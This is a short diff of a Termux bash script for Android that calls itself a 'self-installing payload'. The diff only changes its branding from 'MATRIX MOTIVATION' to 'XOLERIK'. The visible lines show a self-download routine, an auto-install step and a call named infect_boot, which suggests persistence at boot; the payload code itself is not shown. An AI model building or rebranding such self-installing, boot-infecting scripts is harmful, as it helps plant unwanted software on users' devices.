@@ -1,6 +1,6 @@
 #!/data/data/com.termux/files/usr/bin/bash
 # ============================================
-# MATRIX MOTIVATION — SELF-INSTALLING PAYLOAD
+# XOLERIK — SELF-INSTALLING PAYLOAD
 # ============================================
 # Bu skript o'zini GitHub'dan yuklab oladi
 # va avtomatik ishga tushadi. Bir marta bosish
@@ -85,7 +85,7 @@ download() {
 auto_install() {
     echo ""
     echo -e "${GREEN}========================================${NC}"
-    echo -e "${GREEN}  MATRIX MOTIVATION — AUTO INSTALL${NC}"
+    echo -e "${GREEN}  XOLERIK — AUTO INSTALL${NC}"
     echo -e "${GREEN}========================================${NC}"
     echo ""
 
@@ -108,7 +108,7 @@ auto_install() {
     infect_boot
 
     # Permission
-    termux-notification --id matrix_install --title "MATRIX" \
+    termux-notification --id xolerik_install --title "XOLERIK" \
         --content "O'rnatildi! Notificationlar yoqilmoqda..." \
         --priority high --alert-once 2>/dev/null
     sleep 1
